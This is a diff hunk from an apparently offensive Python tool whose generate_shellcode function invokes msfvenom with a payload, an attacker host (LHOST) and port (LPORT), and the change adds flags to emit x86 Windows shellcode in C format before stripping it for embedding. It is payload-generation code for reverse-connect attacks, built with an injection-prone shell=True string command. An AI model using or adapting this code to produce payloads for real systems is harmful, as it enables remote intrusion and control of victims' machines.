@@ -22,7 +22,7 @@ import sys
 # generate base shellcode
 def generate_shellcode(payload,ipaddr,port):
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s c" % (payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : ''}
